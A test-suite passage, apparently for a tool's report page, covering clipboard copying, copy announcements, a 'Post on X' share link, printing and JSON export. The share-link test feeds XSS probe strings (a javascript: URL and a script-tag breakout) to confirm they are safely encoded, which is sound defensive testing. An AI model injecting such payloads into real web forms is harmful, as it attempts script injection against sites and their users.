  it("selects a text area's own text when copying by hand fails", async () => {
    const page = loadPage({ clipboard: "missing", execCopy: "refuses" });
    copyButton(page, "share-text").click();
    await settle();
    expect((page.byId.get("share-text") as FakeElement).selected).toBe(true);
    expect(page.selectedAll).toEqual([]);
  });

  it("announces a copy by the button's name", async () => {
    const page = loadPage();
    copyButton(page, "cmd-init").click();
    await settle();
    for (const fn of page.timers) fn();
    expect(page.byId.get("page-status")?.textContent).toBe("Copied the init command");
    // A second copy clears the region first, so the same message is announced again.
    page.timers.length = 0;
    copyButton(page, "cmd-init").click();
    await settle();
    expect(page.byId.get("page-status")?.textContent).toBe("");
    for (const fn of page.timers) fn();
    expect(page.byId.get("page-status")?.textContent).toBe("Copied the init command");
    expect(logic.copiedText("Copy text of the post")).toBe("Copied text of the post");
    expect(logic.copiedText(null)).toBe("Copied");
  });

  it("keeps the Post-on-X link an X post as the text is edited, and counts it", () => {
    const page = loadPage();
    const input = page.byId.get("share-text") as FakeElement;
    const link = page.byId.get("share-link") as FakeElement;
    for (const typed of ["javascript:alert(1)", '"><script>alert(1)</script>', "a\nb"]) {
      input.value = typed;
      input.fire("input");
      // Exactly the prefix, the typed text encoded, and the rendered suffix: nothing else.
      expect(link.href).toBe(SHARE_PREFIX + encodeURIComponent(typed) + SUFFIX);
      expect(new URL(link.href).searchParams.get("text")).toBe(typed);
    }
    input.value = "edited text \uD800";
    input.fire("input");
    expect(new URL(link.href).searchParams.get("text")).toBe("edited text �");
    input.value = "x".repeat(300);
    input.fire("input");
    expect(page.byId.get("share-count")?.getAttribute("data-over")).toBe("true");
  });

  it("prints, opening every collapsed section and closing them again after", () => {
    const page = loadPage();
    (page.byId.get("print") as FakeElement).click();
    expect(page.printed).toBe(1);
    const details = page.elements.filter((e) => e.tagName === "DETAILS");
    for (const fn of page.windowListeners.get("beforeprint") ?? []) fn();
    expect(details.map((d) => d.open)).toEqual([true, true, true, true]);
    for (const fn of page.windowListeners.get("afterprint") ?? []) fn();
    expect(details.map((d) => d.open)).toEqual([false, false, false, true]);
  });

  it("exports the embedded data as a download, through a data URL", () => {
    const page = loadPage();
    (page.byId.get("export") as FakeElement).click();
    const [link] = page.appended;
    expect(link?.download).toBe("agenttrail-guard-report.json");
    expect(link?.href.startsWith(EXPORT_PREFIX)).toBe(true);
    expect(JSON.parse(decodeURIComponent((link?.href ?? "").slice(EXPORT_PREFIX.length)))).toEqual({
      tool: "agenttrail-guard",
      n: 1,
    });
  });
});
